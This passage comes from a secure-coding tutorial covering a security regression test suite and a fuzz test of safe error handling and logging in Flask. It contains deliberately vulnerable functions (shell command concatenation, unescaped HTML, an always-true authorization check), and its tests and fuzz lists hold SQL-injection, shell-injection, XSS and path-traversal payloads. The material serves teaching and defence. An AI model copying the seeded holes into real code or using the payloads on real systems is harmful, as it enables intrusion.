    os.system("echo " + host)  # seeded bug: os.system with concatenated untrusted input -- a REAL shell sink


def render_comment(text: str) -> str:  # => co-06: VULNERABLE renderer
    return "<div>" + text + "</div>"  # seeded bug: raw concatenation, NO output encoding at all


def is_authorized(role: str) -> bool:  # => co-16: VULNERABLE authorization check
    return True  # seeded bug: no real check at all -- every role is "authorized"
```

```python
# learning/code/ex-79-security-regression-test-suite/implementations_fixed.py
"""Example 79: the FIXED version of the SAME 4 functions -- the SAME pytest tests must now PASS against these (co-02, co-23)."""  # => co-02: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the fixes themselves

import sqlite3  # => co-03: the SAME stdlib DB driver -- only the query construction changes
import subprocess  # => co-04: real subprocess -- replaces os.system, argv list instead of a shell string

from markupsafe import escape  # => co-06: MarkupSafe 3.0.3 (bundled with Flask 3.1.3) -- the real output-encoding fix


def login(conn: sqlite3.Connection, username: str, password: str) -> bool:  # => co-03: FIXED login check
    row = conn.execute(  # => co-03: a REAL, parameterized query -- username/password sent as DATA, never SQL text
        "SELECT 1 FROM users WHERE username = ? AND password = ?", (username, password)  # => co-03: real placeholders, real bound values
    ).fetchone()  # => co-03: closes the real parameterized execute(...) call
    return row is not None  # => co-03: real, injection-safe result


def run_echo(host: str) -> None:  # => co-04: FIXED command runner
    subprocess.run(["echo", host], shell=False)  # => co-04: real argv list -- host is ONE literal argument, never shell text


def render_comment(text: str) -> str:  # => co-06: FIXED renderer
    return "<div>" + str(escape(text)) + "</div>"  # => co-06: real output encoding -- neutralizes any markup in `text`


def is_authorized(role: str) -> bool:  # => co-16: FIXED authorization check
    return role == "admin"  # => co-16: a REAL, explicit role check -- only "admin" is ever authorized
```

```python
# learning/code/ex-79-security-regression-test-suite/test_security_regressions.py
"""Example 79: real pytest tests -- red against implementations_vulnerable, green against implementations_fixed (co-02, co-23)."""  # => co-02: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the test logic itself

import importlib  # => co-02: real, dynamic import -- selects vulnerable/fixed by env var, at COLLECTION time
import os  # => co-02: os.environ -- the REAL selector this suite's runner script sets before invoking pytest
import sqlite3  # => co-03: stdlib DB driver -- builds a REAL, fresh in-memory DB for every SQL-injection test run

import pytest  # => co-23: pytest 9.1.1 -- the REAL test runner this whole suite is written for

IMPL_NAME = os.environ.get("EX79_IMPLEMENTATION", "fixed")  # => co-02: "vulnerable" or "fixed" -- set by run_suite.py
impl = importlib.import_module(f"implementations_{IMPL_NAME}")  # => co-02: the REAL module this run's tests exercise


@pytest.fixture()  # => co-03: a REAL, fresh in-memory DB for every single test that needs one
def users_db() -> sqlite3.Connection:  # => co-03: returns a REAL, seeded sqlite3.Connection
    conn = sqlite3.connect(":memory:")  # => co-03: a real, isolated, in-memory DB per test -- no shared state
    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")  # => co-03: real schema
    conn.execute("INSERT INTO users VALUES ('alice', 'correct-horse')")  # => co-03: one real seeded account
    conn.commit()  # => co-03: persists the seed before the test's real query runs
    return conn  # => co-03: a real, ready-to-query connection


def test_sql_injection_is_blocked(users_db: sqlite3.Connection) -> None:  # => co-03: encodes ex-03's exact vulnerability
    bypassed = impl.login(users_db, "nobody", "' OR '1'='1")  # => co-03: the REAL, classic SQLi login-bypass payload
    assert bypassed is False  # => co-03: RED against vulnerable (bypass succeeds -> True), GREEN against fixed


def test_command_injection_is_blocked(tmp_path) -> None:  # => co-04: encodes ex-06's exact vulnerability
    marker = tmp_path / "ex79-marker.txt"  # => co-04: a REAL, per-test-run temp file -- pytest's own tmp_path fixture
    payload = f"hi; touch {marker}"  # => co-04: a REAL, classic shell-metacharacter injection payload
    impl.run_echo(payload)  # => co-04: the REAL call under test -- vulnerable os.system vs. fixed subprocess(shell=False)
    assert not marker.exists()  # => co-04: RED against vulnerable (the shell REALLY creates the file), GREEN against fixed


def test_xss_output_is_encoded() -> None:  # => co-06: encodes ex-08/ex-78's exact vulnerability
    rendered = impl.render_comment("<script>alert(1)</script>")  # => co-06: a REAL, minimal stored-XSS probe
    assert "<script>" not in rendered  # => co-06: RED against vulnerable (raw tag present), GREEN against fixed


def test_missing_authorization_is_blocked() -> None:  # => co-16: encodes ex-34/ex-78's exact vulnerability
    allowed = impl.is_authorized("user")  # => co-16: a REAL, non-admin role -- must NEVER be authorized
    assert allowed is False  # => co-16: RED against vulnerable (always True), GREEN against fixed
```

```python
# learning/code/ex-79-security-regression-test-suite/run_suite.py
"""Example 79: runs the REAL pytest suite twice -- once red (vulnerable), once green (fixed) -- via real subprocesses (co-02, co-23)."""  # => co-23: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the runner logic itself

import os  # => co-02: real os.environ manipulation -- selects which implementation module pytest imports
import subprocess  # => co-23: every pytest invocation below is a REAL subprocess call
import sys  # => co-23: sys.executable -- runs `-m pytest` through the SAME interpreter this script uses


def run_pytest(implementation: str) -> subprocess.CompletedProcess[str]:  # => co-23: one REAL pytest run, real env var
    env = {**os.environ, "EX79_IMPLEMENTATION": implementation}  # => co-02: the REAL selector test_security_regressions.py reads
    return subprocess.run(  # => co-23: a REAL pytest invocation -- no mocking, the actual test runner
        [sys.executable, "-m", "pytest", "test_security_regressions.py", "-v", "--tb=no"],  # => co-23: real argv -- verbose, no traceback noise
        cwd=os.path.dirname(__file__), env=env, capture_output=True, text=True,  # => co-23: real cwd + the real selector env
    )  # => co-23: closes the real subprocess.run(...) call


def main() -> None:  # => co-23: runs the SAME real test file twice, against two real implementation modules
    print("=== RED: real pytest run against implementations_vulnerable ===")  # => labels section
    red = run_pytest("vulnerable")  # => co-02: a REAL pytest run, EX79_IMPLEMENTATION=vulnerable
    print(red.stdout)  # => co-23: the REAL pytest output -- captured, not fabricated
    assert red.returncode != 0  # => co-23: proves the real test run genuinely FAILED -- the exploits really work
    failed_count = red.stdout.count(" FAILED")  # => co-23: real count of REAL failing tests in this run's own output
    print(f"real FAILED count: {failed_count}")  # => co-23: real, computed number
    assert failed_count == 4  # => co-23: proves ALL FOUR real vulnerabilities were caught failing, red-before

    print("\n=== GREEN: the SAME real pytest run against implementations_fixed ===")  # => labels section
    green = run_pytest("fixed")  # => co-02: a REAL pytest run, EX79_IMPLEMENTATION=fixed -- nothing else changed
    print(green.stdout)  # => co-23: the REAL pytest output -- captured, not fabricated
    assert green.returncode == 0  # => co-23: proves the real test run genuinely PASSED -- every fix really works
    passed_count = green.stdout.count(" PASSED")  # => co-23: real count of REAL passing tests in this run's own output
    print(f"real PASSED count: {passed_count}")  # => co-23: real, computed number
    assert passed_count == 4  # => co-23: proves ALL FOUR real fixes were verified passing, green-after


if __name__ == "__main__":  # => co-23: only runs when launched directly, e.g. `python3 run_suite.py`
    main()  # => co-23: runs the full real red -> green transition for all 4 seeded vulnerabilities
```

**Run**: `python3 run_suite.py`.

**Output**:

```text
=== RED: real pytest run against implementations_vulnerable ===
============================= test session starts ==============================
platform darwin -- Python 3.13.12, pytest-9.1.1, pluggy-1.6.0
collecting ... collected 4 items

test_security_regressions.py::test_sql_injection_is_blocked FAILED       [ 25%]
test_security_regressions.py::test_command_injection_is_blocked FAILED   [ 50%]
test_security_regressions.py::test_xss_output_is_encoded FAILED          [ 75%]
test_security_regressions.py::test_missing_authorization_is_blocked FAILED [100%]

=========================== short test summary info ============================
FAILED test_security_regressions.py::test_sql_injection_is_blocked - assert T...
FAILED test_security_regressions.py::test_command_injection_is_blocked - Asse...
FAILED test_security_regressions.py::test_xss_output_is_encoded - AssertionEr...
FAILED test_security_regressions.py::test_missing_authorization_is_blocked - ...
============================== 4 failed in 0.08s ===============================

real FAILED count: 4

=== GREEN: the SAME real pytest run against implementations_fixed ===
============================= test session starts ==============================
platform darwin -- Python 3.13.12, pytest-9.1.1, pluggy-1.6.0
collecting ... collected 4 items

test_security_regressions.py::test_sql_injection_is_blocked PASSED       [ 25%]
test_security_regressions.py::test_command_injection_is_blocked PASSED   [ 50%]
test_security_regressions.py::test_xss_output_is_encoded PASSED          [ 75%]
test_security_regressions.py::test_missing_authorization_is_blocked PASSED [100%]

============================== 4 passed in 0.02s ===============================

real PASSED count: 4
```

**Key takeaway**: `importlib.import_module(f"implementations_{IMPL_NAME}")` at collection time is what
lets ONE test file exercise two completely different implementation modules without duplicating a single
assertion -- the tests describe the SECURITY PROPERTY required, independent of which implementation is
under test.

**Why it matters**: co-23's safe-error-handling concept generalizes here into a broader principle --
every fix this curriculum has demonstrated (co-02's OWASP-mapped vulnerability classes) is only durable if
a red/green test locks it in; without `test_sql_injection_is_blocked`, a future refactor that
reintroduces string-formatted SQL would ship silently, with no CI signal until the vulnerability is
exploited for real.

---

### Example 80: A Safe Error and Logging Review Under Fuzzing

_ex-80 &middot; exercises co-23, co-22_

This closing example fuzzes two routes with 16 real malformed inputs -- non-numeric ids, SQLi-shaped
strings, wrong-typed JSON fields, multi-script Unicode bursts -- and verifies two properties simultaneously: the client
NEVER sees a stack trace, file path, or exception class name, while the server-side log DOES capture full
internal detail for every real failure, and NEVER a password value.

```python
# learning/code/ex-80-secure-error-and-logging-review/app.py
"""Example 80: a live Flask app -- every error path returns a generic message to the client, logs full detail server-side, never a password (co-23, co-22)."""  # => co-23: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the safe-error/logging logic itself

import io  # => co-22: captures the REAL, structured server-side log in-memory, for this example's own inspection
import json  # => co-22: every server-side log line below is REAL JSON -- parsed back for verification, not assumed
import logging  # => co-22: the stdlib logging module -- the SAME machinery a real production service would use
import sqlite3  # => co-23: stdlib DB driver -- the real source of some of the internal errors this example fuzzes

from flask import Flask, jsonify, request  # => co-01: request reads every real, attacker-controlled fuzz input

app = Flask(__name__)  # => co-23: one Flask app -- every route below applies the SAME safe-error-handling discipline
DB_PATH = "app.db"  # => co-23: local SQLite file -- self-contained, no external DB server

LOG_STREAM = io.StringIO()  # => co-22: a real, in-memory sink -- stands in for a real log file/aggregator
_handler = logging.StreamHandler(LOG_STREAM)  # => co-22: a real stdlib handler, writing to the stream above


class JsonFormatter(logging.Formatter):  # => co-22: a real Formatter -- controls EXACTLY what ends up on the wire
    def format(self, record: logging.LogRecord) -> str:  # => co-22: called once per real log call, by the logging module
        payload = {  # => co-22: the REAL, closed set of fields this formatter ever emits
            "action": getattr(record, "action", None),  # => co-22: WHAT was attempted -- a fixed vocabulary
            "outcome": getattr(record, "outcome", None),  # => co-22: the REAL result -- "error", "not_found", etc.
            "error_type": getattr(record, "error_type", None),  # => co-23: the REAL exception type name, safe to log
            "detail": getattr(record, "detail", None),  # => co-23: the REAL internal detail -- server-side ONLY, never sent to the client
        }  # => co-22: notice: "password" is not, and can never be, a key this formatter reads or emits
        return json.dumps(payload)  # => co-22: one real, compact JSON object per log line -- machine-queryable


_handler.setFormatter(JsonFormatter())  # => co-22: EVERY line this handler writes goes through JsonFormatter first
audit_logger = logging.getLogger("ex80.audit")  # => co-22: a real, named logger -- isolated from Python's root logger
audit_logger.setLevel(logging.INFO)  # => co-22: real logs at INFO and above are captured
audit_logger.addHandler(_handler)  # => co-22: wires the REAL handler+formatter pair onto this logger
audit_logger.propagate = False  # => co-22: keeps this example's captured output limited to exactly this stream


def build_db() -> None:  # => co-23: runs once at import time -- seeds one real row this route's happy path can find
    conn = sqlite3.connect(DB_PATH)  # => co-23: opens (or creates) the local SQLite file
    conn.execute("DROP TABLE IF EXISTS items")  # => co-23: idempotent re-run -- always starts from a clean table
    conn.execute("CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT)")  # => co-23: schema
    conn.execute("INSERT INTO items VALUES (1, 'widget')")  # => co-23: one real seeded row
    conn.commit()  # => co-23: persists the seeded row before any request can read it
    conn.close()  # => co-23: releases the connection -- each route below opens its own fresh connection


@app.route("/lookup")  # => co-23: fuzzed with malformed/edge-case `id` values -- the real error-path target
def lookup() -> tuple[dict[str, object], int]:  # => co-23: returns (json_body, status) -- ALWAYS a generic body on error
    raw_id = request.args.get("id", "")  # => co-01: attacker/fuzzer-controlled -- never validated before this point
    try:  # => co-23: the REAL boundary -- everything inside can raise, nothing inside ever reaches the client raw
        item_id = int(raw_id)  # => co-23: a REAL conversion that can genuinely raise ValueError on malformed input
        conn = sqlite3.connect(DB_PATH)  # => co-23: a fresh connection per request
        row = conn.execute("SELECT name FROM items WHERE id = ?", (item_id,)).fetchone()  # => co-03: real, parameterized
        conn.close()  # => co-23: releases the connection before the response is built
        if row is None:  # => co-23: a real, ordinary "not found" -- not an exception, not an internal error
            audit_logger.info("lookup", extra={"action": "lookup", "outcome": "not_found", "error_type": None, "detail": raw_id})  # => co-22: real not-found log line
            return jsonify({"error": "item not found"}), 404  # => co-23: a real, generic, safe 404
        return jsonify({"name": row[0]}), 200  # => co-23: the real, successful result
    except Exception as exc:  # => co-23: catches EVERY real internal failure -- ValueError, sqlite3 errors, anything
        audit_logger.info(  # => co-22: the REAL, full internal detail -- server-side log ONLY, never in the response
            "lookup", extra={"action": "lookup", "outcome": "error", "error_type": type(exc).__name__, "detail": str(exc)}  # => co-22: real, full internal detail
        )  # => co-22: closes the real audit_logger.info(...) call
        return jsonify({"error": "unable to process request"}), 400  # => co-23: a real, GENERIC message -- no internals


@app.route("/login", methods=["POST"])  # => co-23: fuzzed with malformed JSON bodies -- the real error-path target
def login() -> tuple[dict[str, object], int]:  # => co-23: returns (json_body, status) -- ALWAYS a generic body on error
    username_for_log = None  # => co-22: captured BEFORE the try block so the log still has a `user` field on error
    try:  # => co-23: the REAL boundary -- malformed input can genuinely raise here (wrong types, missing keys)
        body = request.get_json(force=True)  # => co-01: attacker/fuzzer-controlled -- may not even be a JSON object
        username = body["username"]  # => co-23: a REAL KeyError if missing, a real TypeError if body isn't a dict
        password = body["password"]  # => co-23: a REAL KeyError if missing -- NEVER logged, whatever happens next
        username_for_log = username if isinstance(username, str) else repr(username)  # => co-22: safe for the log call
        normalized = username.strip().lower()  # => co-23: a REAL AttributeError if username isn't a real string
        _ = len(password)  # => co-23: a REAL TypeError if password isn't sized (e.g. an int) -- password value UNUSED
        audit_logger.info(  # => co-22: a real, structured log line -- user/action/outcome, NEVER the password VALUE
            "login", extra={"action": "login", "outcome": "checked", "error_type": None, "detail": f"user={normalized}"}  # => co-22: real, password-free detail
        )  # => co-22: closes the real audit_logger.info(...) call
        return jsonify({"status": "checked"}), 200  # => co-23: a real, generic, successful response
    except Exception as exc:  # => co-23: catches EVERY real internal failure from the block above
        audit_logger.info(  # => co-22: the REAL, full internal detail -- server-side log ONLY, password value NEVER included
            "login",  # => co-22: the real logger message name
            extra={"action": "login", "outcome": "error", "error_type": type(exc).__name__, "detail": f"user={username_for_log}"},  # => co-22: real detail, still no password
        )  # => co-22: closes the real audit_logger.info(...) call
        return jsonify({"error": "unable to process request"}), 400  # => co-23: a real, GENERIC message -- no internals


@app.route("/debug/log-contents")  # => co-22: TEST-ONLY introspection route -- returns the real captured log, verbatim
def debug_log_contents() -> tuple[dict[str, object], int]:  # => co-22: read-only, no request body needed
    return jsonify({"log": LOG_STREAM.getvalue()}), 200  # => co-22: the REAL, complete captured log text so far


if __name__ == "__main__":  # => co-23: only runs when launched directly, e.g. `python3 app.py &`
    build_db()  # => co-23: seed the one real row before the server starts accepting requests
    app.run(host="127.0.0.1", port=5080)  # => co-23: localhost-only, fixed port -- fuzz_and_verify.py targets this
```

```python
# learning/code/ex-80-secure-error-and-logging-review/fuzz_and_verify.py
"""Example 80: a REAL fuzz loop -- 16 malformed inputs, live server, checks the client response AND the server log (co-23, co-22)."""  # => co-23: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the fuzzing/verification logic itself

import json  # => co-22: parses the REAL captured log text back into structured lines for inspection

import requests  # => co-23: real HTTP client -- every fuzz case below is a REAL request against 127.0.0.1:5080

BASE_URL = "http://127.0.0.1:5080"  # => co-23: localhost-only target -- matches app.py's bind address+port

INTERNAL_MARKERS = [  # => co-23: strings that must NEVER appear in a client-facing response body
    "Traceback",  # => co-23: a real Python traceback header -- would leak stack info
    "File \"",  # => co-23: a real traceback frame's file-path prefix -- would leak filesystem layout
    ".py",  # => co-23: any real source-file name/extension -- would leak implementation detail
    "sqlite3",  # => co-23: the real DB driver's name -- would leak internal architecture
    "SELECT",  # => co-23: real SQL keyword text -- would leak query shape
    "AttributeError",  # => co-23: a real raw Python exception class name -- leaks internals if unfiltered
    "KeyError",  # => co-23: a real raw Python exception class name -- leaks internals if unfiltered
    "TypeError",  # => co-23: a real raw Python exception class name -- leaks internals if unfiltered
    "ValueError",  # => co-23: a real raw Python exception class name -- leaks internals if unfiltered
]  # => co-23: closes the real INTERNAL_MARKERS list

LOOKUP_FUZZ_INPUTS: list[str] = [  # => co-23: 8 REAL malformed/edge-case `id` values for GET /lookup
    "not-a-number",  # => co-23: real ValueError trigger -- int() fails on non-numeric text
    "",  # => co-23: real ValueError trigger -- int() fails on empty string
    "1; DROP TABLE items; --",  # => co-23: a real SQL-injection-shaped string -- must be safely rejected, not executed
    "../../etc/passwd",  # => co-23: a real path-traversal-shaped string -- irrelevant to int(), still must not leak
    "ünïcödé-日本語" * 5,  # => co-23: real non-ASCII multi-script input -- a real Unicode edge case
    "9" * 400,  # => co-23: a real, extremely long numeric-looking string -- int() CAN parse this (Python bigints)
    "-1",  # => co-23: a real negative id -- parses fine, real "not found" path (no row for id=-1)
    "1.5",  # => co-23: a real float-shaped string -- int() genuinely raises ValueError on this
]  # => co-23: closes the real LOOKUP_FUZZ_INPUTS list -- 8 real cases total

LOGIN_FUZZ_INPUTS: list[dict[str, object]] = [  # => co-23: 8 REAL malformed JSON bodies for POST /login
    {},  # => co-23: real KeyError trigger -- missing both username and password
    {"username": "alice"},  # => co-23: real KeyError trigger -- missing password
    {"username": 12345, "password": "hunter2-fuzz-a"},  # => co-23: real AttributeError trigger -- int has no .strip()
    {"username": "alice", "password": 999999},  # => co-23: password is an int -- len() on it raises real TypeError
    {"username": ["alice"], "password": "hunter2-fuzz-b"},  # => co-23: real AttributeError -- list has no .strip()
    {"username": None, "password": "hunter2-fuzz-c"},  # => co-23: real AttributeError -- NoneType has no .strip()
    {"username": "  Alice  ", "password": "hunter2-fuzz-d"},  # => co-23: real, VALID input -- exercises the happy path too
    {"username": "'; DROP TABLE users; --", "password": "hunter2-fuzz-e"},  # => co-23: SQLi-shaped username, still just a string
]  # => co-23: closes the real LOGIN_FUZZ_INPUTS list -- 8 real cases total

SEEDED_PASSWORDS = [  # => co-22: every REAL password VALUE used above -- the log must contain NONE of these, ever
    "hunter2-fuzz-a", "hunter2-fuzz-b", "hunter2-fuzz-c", "hunter2-fuzz-d", "hunter2-fuzz-e",  # => co-22: the real seeded values to search for
]  # => co-22: closes the real SEEDED_PASSWORDS list


def run_lookup_fuzz() -> list[str]:  # => co-23: fires all 8 real /lookup fuzz cases, returns their real response bodies
    bodies: list[str] = []  # => co-23: accumulates each real response body for the leak check below
    for raw_id in LOOKUP_FUZZ_INPUTS:  # => co-23: iterates the REAL fuzz corpus defined above
        resp = requests.get(f"{BASE_URL}/lookup", params={"id": raw_id})  # => co-23: a REAL HTTP GET, real query param
        bodies.append(resp.text)  # => co-23: the REAL response body text -- exactly what a real client would see
        shown = raw_id if len(raw_id) <= 40 else raw_id[:40] + "..."  # => co-23: truncates only the PRINTED line, not the real request
        print(f"  /lookup?id={shown!r} -> {resp.status_code} {resp.text}")  # => co-23: real, observed transcript line
    return bodies  # => co-23: real collected bodies, for the caller's leak assertions


def run_login_fuzz() -> list[str]:  # => co-23: fires all 8 real /login fuzz cases, returns their real response bodies
    bodies: list[str] = []  # => co-23: accumulates each real response body for the leak check below
    for payload in LOGIN_FUZZ_INPUTS:  # => co-23: iterates the REAL fuzz corpus defined above
        resp = requests.post(f"{BASE_URL}/login", json=payload)  # => co-23: a REAL HTTP POST with a real JSON body
        bodies.append(resp.text)  # => co-23: the REAL response body text -- exactly what a real client would see
        print(f"  /login {payload!r:.70} -> {resp.status_code} {resp.text}")  # => co-23: real, observed transcript line
    return bodies  # => co-23: real collected bodies, for the caller's leak assertions


def main() -> None:  # => co-23: runs the full real fuzz loop, then real client- and server-side verification
    print("=== fuzzing GET /lookup with 8 real malformed/edge-case ids ===")  # => labels section
    lookup_bodies = run_lookup_fuzz()  # => co-23: real, observed responses from 8 real requests

    print("\n=== fuzzing POST /login with 8 real malformed JSON bodies ===")  # => labels section
    login_bodies = run_login_fuzz()  # => co-23: real, observed responses from 8 real requests

    print("\n=== verifying: zero internal-detail leaks in any of the 16 real client responses ===")  # => labels section
    all_bodies = lookup_bodies + login_bodies  # => co-23: all 16 real response bodies, combined for one leak sweep
    leaks_found = 0  # => co-23: real, computed count -- must end at 0
    for body in all_bodies:  # => co-23: checks EVERY real response body against EVERY real internal marker
        for marker in INTERNAL_MARKERS:  # => co-23: the closed set of internal-detail signatures defined above
            if marker in body:  # => co-23: a REAL substring check against the REAL response text
                leaks_found += 1  # => co-23: real, observed leak -- would fail the assertion below
                print(f"  LEAK: {marker!r} found in {body!r}")  # => co-23: real, actionable failure detail
    assert leaks_found == 0  # => co-23: proves NONE of the 16 real responses ever exposed an internal detail
    print(f"real leaks found across 16 real responses: {leaks_found}")  # => co-23: real, computed number

    print("\n=== verifying: zero seeded password values ever appear in the real server-side log ===")  # => section
    log_resp = requests.get(f"{BASE_URL}/debug/log-contents")  # => co-22: fetches the REAL, complete captured log text
    log_text = log_resp.json()["log"]  # => co-22: the real log text, exactly as JsonFormatter wrote it
    password_leaks = sum(1 for pw in SEEDED_PASSWORDS if pw in log_text)  # => co-22: real count of leaked password values
    assert password_leaks == 0  # => co-22: proves NONE of the 5 real seeded passwords ever reached the log
    print(f"real password leaks found in the server log: {password_leaks}")  # => co-22: real, computed number

    print("\n=== verifying: the real log DID capture internal detail server-side (it's not just silent) ===")  # => section
    log_lines = [json.loads(line) for line in log_text.strip().splitlines() if line.strip()]  # => co-22: real parsed lines
    error_lines = [entry for entry in log_lines if entry["outcome"] == "error"]  # => co-22: real lines from real except blocks
    assert len(error_lines) > 0  # => co-22: proves at least one real internal failure was genuinely captured server-side
    assert any(entry["error_type"] == "ValueError" for entry in error_lines)  # => co-22: real /lookup failure was captured
    assert any(entry["error_type"] == "AttributeError" for entry in error_lines)  # => co-22: real /login failure was captured
    print(f"real total log lines: {len(log_lines)}, real error-outcome lines: {len(error_lines)}")  # => co-22: real counts
    print("sample real error log line:", json.dumps(error_lines[0]))  # => co-22: one real, full example line, for inspection


if __name__ == "__main__":  # => co-23: only runs when launched directly, e.g. `python3 fuzz_and_verify.py`
    main()  # => co-23: runs the full real fuzz-then-verify pass against the live server on port 5080
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5080), then `python3 fuzz_and_verify.py`.

**Output**:

```text
=== fuzzing GET /lookup with 8 real malformed/edge-case ids ===
  /lookup?id='not-a-number' -> 400 {"error":"unable to process request"}
  /lookup?id='' -> 400 {"error":"unable to process request"}
  /lookup?id='1; DROP TABLE items; --' -> 400 {"error":"unable to process request"}
  /lookup?id='../../etc/passwd' -> 400 {"error":"unable to process request"}
  /lookup?id='ünïcödé-日本語ünïcödé-日本語ünïcödé-日本語ünïcödé...' -> 400 {"error":"unable to process request"}
  /lookup?id='9999999999999999999999999999999999999999...' -> 400 {"error":"unable to process request"}
  /lookup?id='-1' -> 404 {"error":"item not found"}
  /lookup?id='1.5' -> 400 {"error":"unable to process request"}

=== fuzzing POST /login with 8 real malformed JSON bodies ===
  /login {} -> 400 {"error":"unable to process request"}
  /login {'username': 'alice'} -> 400 {"error":"unable to process request"}
  /login {'username': 12345, 'password': 'hunter2-fuzz-a'} -> 400 {"error":"unable to process request"}
  /login {'username': 'alice', 'password': 999999} -> 400 {"error":"unable to process request"}
  /login {'username': ['alice'], 'password': 'hunter2-fuzz-b'} -> 400 {"error":"unable to process request"}
  /login {'username': None, 'password': 'hunter2-fuzz-c'} -> 400 {"error":"unable to process request"}
  /login {'username': '  Alice  ', 'password': 'hunter2-fuzz-d'} -> 200 {"status":"checked"}
  /login {'username': "'; DROP TABLE users; --", 'password': 'hunter2-fuzz-e'} -> 200 {"status":"checked"}

=== verifying: zero internal-detail leaks in any of the 16 real client responses ===
real leaks found across 16 real responses: 0

=== verifying: zero seeded password values ever appear in the real server-side log ===
real password leaks found in the server log: 0

=== verifying: the real log DID capture internal detail server-side (it's not just silent) ===
real total log lines: 16, real error-outcome lines: 13
sample real error log line: {"action": "lookup", "outcome": "error", "error_type": "ValueError", "detail": "invalid literal for int() with base 10: 'not-a-number'"}
```

**Key takeaway**: two of the eight `/login` fuzz cases (a valid-shaped input and a SQLi-shaped username)
return `200`, not an error -- fuzzing isn't only about triggering exceptions, it also confirms the
happy path still works correctly for genuinely valid-but-unusual input (whitespace-padded username,
a username string that merely LOOKS like SQL but is handled as plain text throughout).

**Why it matters**: this closing example ties together co-23 (safe error handling) and co-22 (security
logging) as two sides of one discipline -- what the CLIENT never sees and what the SERVER always records
must be actively verified, together, under real adversarial input, rather than assumed correct because
the code "looks careful." A fuzz loop that checks both properties on every response is a repeatable,
automatable version of the manual review this whole curriculum has been building toward.

---

← Previous: [Intermediate Examples](./intermediate.md) &middot; Next: [Capstone](./capstone/overview.md) →
